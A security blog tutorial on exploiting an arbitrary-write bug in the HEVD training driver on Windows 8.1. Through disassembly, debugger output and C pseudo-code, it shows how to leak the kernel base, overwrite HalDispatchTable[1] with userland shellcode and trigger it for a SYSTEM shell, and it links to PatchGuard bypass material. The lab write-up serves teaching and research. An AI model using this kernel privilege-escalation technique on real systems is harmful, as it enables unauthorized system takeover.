<!doctype html><html lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name=viewport><meta content=BlahCats name=author><meta content="Tales of a binary encoded life..." name=description><meta prefix="og: http://ogp.me/ns#" content=BlahCats property=og:site_name><meta prefix="og: http://ogp.me/ns#" content=blog property=og:type><meta content="Arbitrary Write primitive in Windows kernel (HEVD)" prefix="og: http://ogp.me/ns#" property=og:title><meta content="Arbitrary Write primitive in Windows kernel (HEVD) - by hugsy" prefix="og: http://ogp.me/ns#" property=og:description><meta prefix="og: http://ogp.me/ns#" content=en_US property=og:locale><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/2017-08-31-arbitrary-write-primitive-in-windows-kernel-hevd property=og:url><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/img/win-kernel-debug/hevd-www-hal-interrupt.png property=og:image><meta content=summary_large_image name=twitter:card><meta content=@ctf_blahcat name=twitter:site><meta content=BlahCats name=twitter:title><meta content="Arbitrary Write primitive in Windows kernel (HEVD) - by hugsy" name=twitter:description><meta content=https://blahcat.github.io/2017-08-31-arbitrary-write-primitive-in-windows-kernel-hevd name=twitter:url><meta content=https://blahcat.github.io/img/win-kernel-debug/hevd-www-hal-interrupt.png name=twitter:image:src><script type=application/ld+json>
    {
      "@context" : "http://schema.org",
      "@type" : "Website",
      "name": " BlahCats",
      "url" : "https://blahcat.github.io/2017-08-31-arbitrary-write-primitive-in-windows-kernel-hevd",
      
      "image": https://blahcat.github.io/img/win-kernel-debug/hevd-www-hal-interrupt.png",
      
      
      "description": Arbitrary Write primitive in Windows kernel (HEVD) - by hugsy",
      
    }
    </script><title>
  Arbitrary Write primitive in Windows kernel (HEVD)
</title><link href=https://blahcat.github.io/img/favicon.ico rel=icon type=image/x-icon><link href=https://blahcat.github.io/css/bootstrap.min.css rel=stylesheet><link href=" https://blahcat.github.io/css/all.min.css" rel=" stylesheet"><link href="https://fonts.googleapis.com/css?family=Roboto" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Montserrat:400,300" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lato" -- <!-- custom for rel=stylesheet styles template this><link href=https://blahcat.github.io/css/clean-blog.css rel=stylesheet><link href=https://blahcat.github.io/css/overrides.css rel=stylesheet><link integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css referrerpolicy=no-referrer rel=stylesheet><body><nav class="navbar navbar-expand-lg navbar-light fixed-top" id=mainNav><div class=container><a class=navbar-brand href=https://blahcat.github.io>BlahCats Blog</a><button aria-label="Toggle navigation" class="navbar-toggler navbar-toggler-right" aria-controls=navbarResponsive aria-expanded=false data-target=#navbarResponsive data-toggle=collapse type=button>Menu <i class="fas fa-bars"></i></button><div class="collapse navbar-collapse" id=navbarResponsive><ul class="navbar-nav ml-auto"><li class=nav-item><a class=nav-link href=https://blahcat.github.io>Home</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/series>Series</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/notes>Notes</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/about>About</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/qemu>Qemu VMs</a></ul></div></div></nav><header class=masthead style=background-image:url(https://blahcat.github.io/img/win-kernel-debug/hevd-www-hal-interrupt.png)><div class=overlay></div><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><div class=post-heading><h1>Arbitrary Write primitive in Windows kernel (HEVD)</h1><span class=meta> <b> ‚Ä¢ <a href=/author/hugsy>hugsy</a> ‚Ä¢ </b> 31 August 2017 <br> <br> <i>Reading time: 11 min</i> </span></div></div></div></div></header><article><article class=post><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><p>Back again to modern Windows kernel exploitation!<p>After understanding <a href=/posts/2017/08/14/a-primer-to-windows-x64-shellcoding>how to build shellcodes for Windows 64-bit</a> and applying this knowledge on <a href=/posts/2017/08/18/first-exploit-in-windows-kernel-hevd>a trivial kernel stack overflow vulnerability</a> we are ready to start moving towards more real-life types of vulnerabilities, such as Type Confusion or Kernel Pool exploit, but for now we‚Äôll cover the case of <em>Arbitrary Write</em> (aka <em>Write-What-Where</em>) vulnerabilities.<p>We‚Äôll use the same configuration than the one used before (target is up-to-date Windows 8.1 x64 VM with HEVD v.1.20 driver installed). For more info about the setup, refer to the first post of this Windows Kernel exploitation series.<h1 id=recon>Recon</h1><h2 id=ida-to-the-rescue>IDA to the rescue</h2><p>After not that much effort in IDA by tracing down the IOCTL dispatching function callgraph, we spot the function <code>TriggerArbitraryOverwrite()</code> which can be reached via a IOCTL with a code of 0x22200B. The vulnerability is easy to spot:</p><a href=/img/win-kernel-debug/hevd-www-ida-vuln-spotting.png target=_blank> <img alt=image_alt src=/img/win-kernel-debug/hevd-www-ida-vuln-spotting.png title=image_alt width=100%> </a><p>After checking the address we passed and printing some kernel debug messages, the function copies the value dereferenced from <code>rbx</code> (which is the function parameter which we control) into the 32-bit register <code>r11d</code>. This value is then written at the address pointed by <code>rdi</code>.<p>Or better summarized in assembly - <code>rcx</code> holds the function first argument (see [<a href=https://blahcat.github.io/2017-08-31-arbitrary-write-primitive-in-windows-kernel-hevd/#related-links>2</a>] for a good reminder about calling conventions):<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>0000000000015B89 mov     r12, rcx
</span><span>[...]
</span><span>0000000000015B95 call    cs:__imp_ProbeForRead
</span><span>0000000000015B9B mov     rbx, [r12]
</span><span>0000000000015B9F mov     rdi, [r12+8]
</span><span>[...]
</span><span>0000000000015BEC mov     r11d, [rbx]
</span><span>0000000000015BEF mov     [rdi], r11d
</span></code></pre><p>So as we can observe at 0x15BEF, we do have an arbitrary write, but a partial one as we only can write one DWORD at a time. No big deal, since we fully control the destination location, we can write a QWORD by simply performing 2 writes at <code>ADDR_DEST</code> then <code>ADDR_DEST+4</code>.<p>This is pretty much it for the vulnerability: classic case of an <strong>Arbitrary Write</strong> (aka <strong>Write-What-Where</strong>). Although we are in kernel-land, we‚Äôll see that the exploitation approach stays the same as when such situation occurs in user-land.<h2 id=write-what>Write what ?</h2><p>So what can we do with an Arbitrary Write?<p>Well, just like in usermode, one of the most common approach is to transform this situation into a code execution, which can be done by overwriting a writable location in the kernel, which we‚Äôll then force a call to. By overwriting a function pointer with the location of our shellcode placed in userland, and then triggering this call from userland would be enough to reach our goal (and of course, assuming SMEP is off).<p>But in kernel-land, this is not the only approach. Another one would be to overwrite the current process‚Äô token by overwriting directly the <code>_SEP_TOKEN_PRIVILEGES</code> and for example, provide it with the <code>SeDebugPrivilege</code> allowing it to perform any further privileged operation on the system (naturally it is assumed here that we know the current process structure‚Äôs address - through an infoleak or else). Back in 2012, <i class="fa fa-twitter"><a class="fab fa-twitter" href=https://twitter.com/cesarcer target=_blank> <code>@cesarcer</code> </a> </i> covered this very situation in his Black Hat presentation <a rel="noopener nofollow noreferrer" href=https://web.archive.org/web/20160909195733/https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf target=_blank>Easy Local Windows Kernel Exploitation</a>.<p>Although this second way would allow to work around SMEP, for the sake of this post we‚Äôll go with the first approach as it is the most commonly used.<h2 id=write-where>Write where ?</h2><p>The kernel has plenty of function pointer arrays that we could use for our purpose. One of the first we could think of would be the system calls table. The <em>System Service Descriptor Table</em> (SSDT) is usually known for being hooked, as this table contains the service tables in use when processing system calls. In KD, we can reach it at with the following symbol: <code>nt!KeServiceDescriptorTable</code><pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>kd> dps nt!KeServiceDescriptorTable
</span><span>fffff802`f8b57a80  fffff802`f895ad00 nt!KiServiceTable
</span><span>fffff802`f8b57a88  00000000`00000000
</span><span>fffff802`f8b57a90  00000000`000001b1
</span><span>fffff802`f8b57a98  fffff802`f895ba8c nt!KiArgumentTable
</span><span>fffff802`f8b57aa0  00000000`00000000
</span><span>fffff802`f8b57aa8  00000000`00000000
</span><span>fffff802`f8b57ab0  00000000`00000000
</span><span>fffff802`f8b57ab8  00000000`00000000
</span><span>fffff802`f8b57ac0  fffff802`f895ad00 nt!KiServiceTable
</span><span>[...]
</span></code></pre><p>I‚Äôve actually decided to use another way described very well on <a rel="noopener nofollow noreferrer" href=http://poppopret.blogspot.ca/2011/07/windows-kernel-exploitation-basics-part.html target=_blank>Xst3nZ</a>‚Äôs blog, by overwriting the <code>HalDispatchTable</code>. The reason this table is particularly interesting, is that it can be fetched from userland by mapping <code>ntoskrnl.exe</code> and using <code>GetProcAddr("HalDispatch")</code> to know its offset. As a result, we‚Äôll have a much more portable exploit code (rather than hardcoding the offset by hand).<p>But why <code>HalDispatchTable</code> in particular? Because we can call from userland the undocumented function <a rel="noopener nofollow noreferrer" href=https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/profile/queryinterval.htm target=_blank><code>NtQueryIntervalProfile</code></a>, that will in turn invoke <code>nt!KeQueryIntervalProfile</code> in the kernel, which to finally perform a <code>call</code> instruction to the address in <code>nt!HalDispatchTable[1]</code>:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>kd>  u nt!KeQueryIntervalProfile+0x9 l7
</span><span>nt!KeQueryIntervalProfile+0x9:
</span><span>fffff802`f8cbc23d ba18000000      mov     edx,18h
</span><span>fffff802`f8cbc242 894c2420        mov     dword ptr [rsp+20h],ecx
</span><span>fffff802`f8cbc246 4c8d4c2450      lea     r9,[rsp+50h]
</span><span>fffff802`f8cbc24b 8d4ae9          lea     ecx,[rdx-17h]
</span><span>fffff802`f8cbc24e 4c8d442420      lea     r8,[rsp+20h]
</span><span>fffff802`f8cbc253 ff15af83deff    call    qword ptr [nt!HalDispatchTable+0x8 (fffff802`f8aa4608)]  &LT-- this is interesting!
</span><span>fffff802`f8cbc259 85c0            test    eax,eax
</span><span>fffff802`f8cbc25b 7818            js      nt!KeQueryIntervalProfile+0x41 (fffff802`f8cbc275)
</span></code></pre><p>So if we use the WWW vulnerability to overwrite <code>nt!HalDispatchTable[1]</code> with the address of our shellcode mapped in a RWX location in userland, then use the undocumented <code>NtQueryIntervalProfile</code> to trigger it, we will make the kernel execute our shellcode! And game over üòÄ<p>For those unfamiliar with the <a rel="noopener nofollow noreferrer" href=https://wiki.osdev.org/Hardware_Abstraction_Layer target=_blank>Hardware Abstraction Layer (or HAL)</a>, it is a software layer aiming to provide a common unified interface to heterogeneous hardware (motherboard, CPUs, network cards, etc.). On Windows, it resides in <a rel="noopener nofollow noreferrer" href=https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/windows-kernel-mode-hal-library target=_blank><code>hal.dll</code></a> that is invoked by <code>ntoskrnl.exe</code>:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>~/tmp/win81/mnt/Windows/System32/ </span><span style=color:#b48ead>[</span><span>hugsy@ph0ny</span><span style=color:#b48ead>]  [</span><span>02:43</span><span style=color:#b48ead>]
</span><span style=color:#bf616a>‚ûú</span><span>  py list_imports.py ./ntoskrnl.exe
</span><span style=color:#bf616a>Listing</span><span> IMPORT table for '</span><span style=color:#a3be8c>./ntoskrnl.exe</span><span>'
</span><span style=color:#bf616a>[...]
</span><span style=color:#bf616a>[+]</span><span> HAL.dll
</span><span>        </span><span style=color:#bf616a>0x140349070</span><span> : HalGetVectorInput
</span><span>        </span><span style=color:#bf616a>0x140349078</span><span> : HalSetEnvironmentVariable
</span><span>        </span><span style=color:#bf616a>0x140349080</span><span> : HalGetEnvironmentVariable
</span><span>        </span><span style=color:#bf616a>0x140349088</span><span> : HalInitializeOnResume
</span><span>        </span><span style=color:#bf616a>0x140349090</span><span> : HalAllocateCrashDumpRegisters
</span><span>        </span><span style=color:#bf616a>0x140349098</span><span> : HalGetMemoryCachingRequirements
</span><span>        </span><span style=color:#bf616a>0x1403490a0</span><span> : HalProcessorIdle
</span><span>        </span><span style=color:#bf616a>0x1403490a8</span><span> : HalGetInterruptTargetInformation
</span><span>        </span><span style=color:#bf616a>0x1403490b0</span><span> : KeFlushWriteBuffer
</span><span style=color:#bf616a>[...]
</span></code></pre><p>Speaking of the HAL, <code>hal.dll</code> has some very interesting properties exploitation-wise. Among others, my first attempt was to overwrite the pointers table located at <code>0xFFD00000</code> (on x86 and x64). Actually the range <code>0xFFD00000-0xFFE00000</code> is interesting because since the HAL driver is loaded so early (actually even before the Windows memory manager) during the boot process, it‚Äôll require known static addresses to map and store information collected about the hardware in memory. Researchers such as <a class="fab fa-twitter" href=https://twitter.com/d_olex target=_blank> <code>@d_olex</code> </a> have explored this path as early as 2011 to use it as an exploit vector as Win7 SP1 used to have this section static and with Read/Write/Execute permission (although it exists on Windows 8 and up, it is ‚Äúonly‚Äù Read/Write)</p><a href=/img/win-kernel-debug/hevd-www-hal-interrupt.png target=_blank> <img alt="Windows 8.1 HAL section" title="Windows 8.1 HAL section" src=/img/win-kernel-debug/hevd-www-hal-interrupt.png width=100%> </a><p><strong>Note</strong>: Looking for references about HAL interrupt table corruption, I came across this recent and fantastic <a rel="noopener nofollow noreferrer" href=https://labs.bluefrostsecurity.de/blog/2017/05/11/windows-10-hals-heap-extinction-of-the-halpinterruptcontroller-table-exploitation-technique/ target=_blank>blog post</a> by <a class="fab fa-twitter" href=https://twitter.com/NicoEconomou target=_blank> <code>@NicoEconomou</code> </a> that covers exactly this approach. I might dedicate a future post applying this technique to HEVD as this table is also an excellent target for WWW scenario.<h1 id=building-the-exploit>Building the exploit</h1><p><strong>Note</strong>: Some convenience functions of this exploit are located in the <a rel="noopener nofollow noreferrer" href=https://github.com/hugsy/hevd/blob/feb6d67ca5f5f3c0718042b42e22adbeee6aee62/KePwnLib.h target=_blank><code>KePwnLib.h</code></a> library I wrote. Feel free to use it!<p>The very first part of the exploit is very similar to what we did in the former post, with the new IOCTL code:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#65737e>// Get the device handle
</span><span style=color:#b48ead>#define </span><span>IOCTL_HEVD_ARBITRARY_OVERWRITE </span><span style=color:#d08770>0x22200b
</span><span>
</span><span>HANDLE hDevice = </span><span style=color:#bf616a>CreateFileA</span><span>("</span><span style=color:#96b5b4>\\\\</span><span style=color:#a3be8c>.</span><span style=color:#96b5b4>\\</span><span style=color:#a3be8c>HackSysExtremeVulnerableDriver</span><span>", ...);
</span><span>
</span><span style=color:#65737e>// Also prepare our shellcode in userland
</span><span>ULONG_PTR lpShellcode = </span><span style=color:#bf616a>AllocatePageWithShellcode</span><span>();
</span></code></pre><p>And when sending the IOCTL, pass in a buffer of 2 ULONG_PTR (index 0 is the <em>What</em>, 1 is the <em>Where</em>).<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#65737e>// Overwrite the 1st DWORD pointed by WHERE
</span><span>ULONG_PTR lpBufferIn[</span><span style=color:#d08770>2</span><span>] = {WHAT, WHERE};
</span><span style=color:#bf616a>DeviceIoControl</span><span>(hDevice, IOCTL_HEVD_ARBITRARY_OVERWRITE, lpBufferIn, sizeof(lpBufferIn), ...);
</span><span>
</span><span style=color:#65737e>// Overwrite the 2nd DWORD pointed by WHERE
</span><span>lpBufferIn[</span><span style=color:#d08770>2</span><span>] = {WHAT+</span><span style=color:#d08770>4</span><span>, WHERE+</span><span style=color:#d08770>4</span><span>};
</span><span style=color:#bf616a>DeviceIoControl</span><span>(hDevice, IOCTL_HEVD_ARBITRARY_OVERWRITE, lpBufferIn, sizeof(lpBufferIn), ...);
</span></code></pre><p>And if we test with dummy values: <a href=/img/win-kernel-debug/hevd-www-testing-exploit.png target=_blank> <img alt=exploit-test src=/img/win-kernel-debug/hevd-www-testing-exploit.png title=exploit-test width=100%> </a><p>The <code>WHAT</code> corresponds to our shellcode (<code>lpShellcode</code>), which we know. Now we need the <code>WHERE</code> (i.e. <code>nt!HalDispatchTable[1]</code>)‚Ä¶ which a kernel address! As we know, any mapped address can be translated to <code>MmappedAddress = ImageBase + offset</code>.<h2 id=get-the-kernel-image-base-address-from-undocumented-systeminformationclass>Get the Kernel Image Base Address from undocumented SystemInformationClass</h2><p>By reading <a rel="noopener nofollow noreferrer" href=https://recon.cx/2013/slides/Recon2013-Alex%20Ionescu-I%20got%2099%20problems%20but%20a%20kernel%20pointer%20ain%27t%20one.pdf target=_blank>Alex Ionescu - I got 99 problems but a kernel pointer ain‚Äôt one (REcon 2013)</a> I discovered that by passing a System Information Class of <a rel="noopener nofollow noreferrer" href=https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/class.htm target=_blank><code>SystemModuleInformation</code> (0xb)</a> to <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms724509(v=vs.85).aspx" rel="noopener nofollow noreferrer" target=_blank><code>NtQuerySystemInformation</code></a>, Windows will leak all kernel modules information (full path, image base address, etc.), including the kernel itself! So finding the image base of the kernel <code>ntoskrnl.exe</code> can be done as follow (in very approximate pseudo-code - just to give an idea):<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#b48ead>#define </span><span>SystemModuleInformation  (SYSTEM_INFORMATION_CLASS)</span><span style=color:#d08770>0xb
</span><span>
</span><span>Modules = </span><span style=color:#96b5b4>malloc</span><span>(</span><span style=color:#d08770>0x100000</span><span>);
</span><span>status = </span><span style=color:#bf616a>NtQuerySystemInformation</span><span>(SystemModuleInformation, Modules, </span><span style=color:#d08770>0x100000</span><span>, ...);
</span><span style=color:#b48ead>if </span><span>(</span><span style=color:#bf616a>NT_SUCCESS</span><span>(status)){
</span><span>  </span><span style=color:#b48ead>for </span><span>(</span><span style=color:#b48ead>int</span><span> i=</span><span style=color:#d08770>0</span><span>; i&LTModules->NumberOfModules; i++){
</span><span>    </span><span style=color:#b48ead>if </span><span>(</span><span style=color:#96b5b4>strstr</span><span>(Modules->Modules[i].</span><span style=color:#bf616a>FullPathName</span><span>, "</span><span style=color:#a3be8c>ntoskrnl.exe</span><span>")!=</span><span style=color:#d08770>0</span><span>){
</span><span>       </span><span style=color:#bf616a>info</span><span>("</span><span style=color:#a3be8c>Found Kernel as Module[</span><span style=color:#d08770>%d</span><span style=color:#a3be8c>] -> </span><span style=color:#d08770>%s</span><span style=color:#a3be8c> (</span><span style=color:#d08770>%p</span><span style=color:#a3be8c>)</span><span style=color:#96b5b4>\n</span><span>", i, Modules->Modules[i].</span><span style=color:#bf616a>FullPathName</span><span>, Modules->Modules[i].</span><span style=color:#bf616a>ImageBase</span><span>);
</span><span>       KernelImageBaseAddress = Modules->Modules[i].</span><span style=color:#bf616a>ImageBase</span><span>;
</span><span>    }
</span><span>  }
</span><span>}
</span></code></pre><p>All structures used are very well defined and documented in the <a rel="noopener nofollow noreferrer" href=http://processhacker.sourceforge.net/doc/ntldr_8h_source.html#l00511 target=_blank><code>Process Hacker tool source code</code></a>. If you go with your implementation of the exploit, you might want to read that first.<p>Now we‚Äôve got the <code>ImageBase</code> component.<h2 id=get-the-offset-from-the-kernel-image>Get the offset from the kernel image</h2><p>This step is actually much easier. All we need to do is to :<ol><li>load the kernel image <code>ntoskrnl.exe</code> and store its base address<li>retrieve the address of <code>HalDispatchTable</code><li>subtract the two pointers found above</ol><p>Or again, in very pseudo-C:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span>HMODULE hNtosMod = </span><span style=color:#bf616a>LoadLibrary</span><span>("</span><span style=color:#a3be8c>ntoskrnl.exe</span><span>");
</span><span>ULONG lNtHalDispatchTableOffset = (ULONG)</span><span style=color:#bf616a>GetProcAddress</span><span>(hNtosMod, "</span><span style=color:#a3be8c>HalDispatchTable</span><span>") - (ULONG)hNtosMod;
</span></code></pre><p>And yeah, that‚Äôs all! Now that we‚Äôve also got the offset, we know that <code>HalDispatchTableInKernel = KernelImageBaseAddress + lNtHalDispatchTableOffset</code>, which is the <code>WHERE</code> condition we needed above! Therefore, we have everything to overwrite <code>nt!HalDispatchTable[1]</code>.<h2 id=triggering-the-corrupted-hal-entry>Triggering the corrupted HAL entry</h2><p>Now that we‚Äôve successfully overwritten the <code>HalDispatchTable</code>, we need a way to force a call to the corrupted pointer in <code>nt!HalDispatchTable[1]</code>. As aforementioned, that can be done with the undocumented <code>nt!NtQueryIntervalProfile</code>. So the last piece of our exploit can be written as simply as<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span>NtQueryIntervalProfile = </span><span style=color:#bf616a>GetProcAddress</span><span>(</span><span style=color:#bf616a>GetModuleHandle</span><span>(</span><span style=color:#bf616a>TEXT</span><span>("</span><span style=color:#a3be8c>ntdll.dll</span><span>")));
</span><span>ULONG dummy1=</span><span style=color:#d08770>1</span><span>, dummy2;
</span><span style=color:#bf616a>NtQueryIntervalProfile</span><span>(dummy1, &dummy2);
</span></code></pre><h2 id=assembling-all-the-pieces>Assembling all the pieces</h2><p>The clean final exploit can be found <a rel="noopener nofollow noreferrer" href=https://github.com/hugsy/hevd/blob/c04e46ababbb78913ef228c31389370f17d8e48a/ArbitraryOverwrite/exploit.c target=_blank>here</a>.</p><a href=/img/win-kernel-debug/hevd-www-final-exploit.png target=_blank> <img alt=image_alt src=/img/win-kernel-debug/hevd-www-final-exploit.png title=image_alt width=100%> </a><p>You can now enjoy the privileged shell so well deserved!<h2 id=about-patchguard>About PatchGuard</h2><p>Windows XP/2003 and up use <a rel="noopener nofollow noreferrer" href=https://en.wikipedia.org/wiki/Kernel_Patch_Protection target=_blank>Kernel Patch Protection (aka PatchGuard)</a> to protect sensitive locations, including the SSDT and HAL (among other). Since this technique will modify the HAL table, PG will detect it and force a<p>Although PG bypass is not the subject of this post, it should be noted that <a href="http://uninformed.org/index.cgi?v=3&a=3&p=7" rel="noopener nofollow noreferrer" target=_blank>several</a> <a href="http://uninformed.org/index.cgi?v=6&a=1&p=25" rel="noopener nofollow noreferrer" target=_blank>public</a> <a rel="noopener nofollow noreferrer" href=https://web.archive.org/web/20180312140501/http://fyyre.ru/vault/bootloader_v2.txt target=_blank>papers</a> and <a rel="noopener nofollow noreferrer" href=https://github.com/hfiref0x/UPGDSED target=_blank>tools</a> cover ways to bypass it.<h1 id=conclusion>Conclusion</h1><p>In this chapter we‚Äôve covered how to exploit Arbitrary Write conditions in the kernel to achieve code execution, by leveraging undocumented procedures and functions that leak valuable kernel information straight from userland. Many more leaks exist, and I definitely recommend watching <a class="fab fa-twitter" href=https://twitter.com/aionescu target=_blank> <code>@aionescu</code> </a> .<p>See you next time ‚úå<h2 id=related-links>Related links</h2><ol><li><a rel="noopener nofollow noreferrer" href=https://www.coresecurity.com/core-labs/articles/abusing-gdi-for-ring0-exploit-primitives target=_blank>Abusing GDI for Ring0 exploit primitives</a>: Another interesting way to exploit WWW conditions by Diego Juarez through GDI<li><a rel="noopener nofollow noreferrer" href=http://www.agner.org/optimize/calling_conventions.pdf target=_blank>Calling conventions for different C++ compilers and operating systems</a><li><a rel="noopener nofollow noreferrer" href=https://www.geoffchappell.com/studies/windows/km target=_blank>An excellent reference of Windows internal structures by Geoff Chappell</a><li><a href="http://uninformed.org/index.cgi?v=3&a=3&p=9" rel="noopener nofollow noreferrer" target=_blank>Uninformed - PatchGuard & SSDT</a><li><a rel="noopener nofollow noreferrer" href=https://dl.packetstormsecurity.net/papers/bypass/NES-BypassWin7KernelAslr.pdf target=_blank>Bypassing Windows 7 Kernel ASLR</a></ol><aside class=post-tags><p>Categories: <a href=https://blahcat.github.io/categories/tutorial/>#tutorial</a> <a href=https://blahcat.github.io/categories/research/>#research</a><p>Tags: <a href=https://blahcat.github.io/tags/pwn/>#pwn</a> <a href=https://blahcat.github.io/tags/windows/>#windows</a> <a href=https://blahcat.github.io/tags/hevd/>#hevd</a> <a href=https://blahcat.github.io/tags/kernel/>#kernel</a> <a href=https://blahcat.github.io/tags/pwn/>#pwn</a> <a href=https://blahcat.github.io/tags/write-what-where/>#write-what-where</a></aside><aside class=post-discussion>Join the Discussion on <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=Arbitrary Write primitive in Windows kernel (HEVD)" target=_blank> <i class="fab fa-github fa-lg"></i>¬†GitHub </a></aside><aside class=post-nav><div class=container><div class=row><div class=col><b>Next:</b><br><a class=post-nav-prev href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/> <section class=post-nav-teaser><b class=post-nav-title>FlareOn 4 WriteUps</b><p class=post-nav-excerpt>This year, I happened to finally have a chance to be in a good position to ‚Ä¶</section> </a></div><div class=col><b>Previous:</b><br><a class=post-nav-next href=https://blahcat.github.io/2017-08-18-first-exploit-in-windows-kernel-hevd/> <section class=post-nav-teaser><b class=post-nav-title>First exploit in Windows Kernel (HEVD)</b><p class=post-nav-excerpt>Hi there ‚úã This post is the third chapter of this series, where we dive int‚Ä¶</section> </a></div></div></div></aside></div></div><hr><footer><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><ul class="list-inline text-center"><li class=list-inline-item><a href=https://blahcat.github.io/atom.xml> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fas fa-rss fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://twitter.com/ctf_blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-twitter fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://github.com/blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-github fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-youtube fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://discord.gg/hSbqxxBgRX> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-discord fa-stack-1x fa-inverse"></i> </span> </a></ul><p class="copyright text-muted">Made with ‚ù§ with Zola</div></div></div></footer><script src=https://blahcat.github.io/js/jquery.min.js></script><script src=https://blahcat.github.io/js/bootstrap.bundle.min.js></script><script src=https://blahcat.github.io/js/clean-blog.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js></script><div class=mermaidTooltip style=opacity:0></div>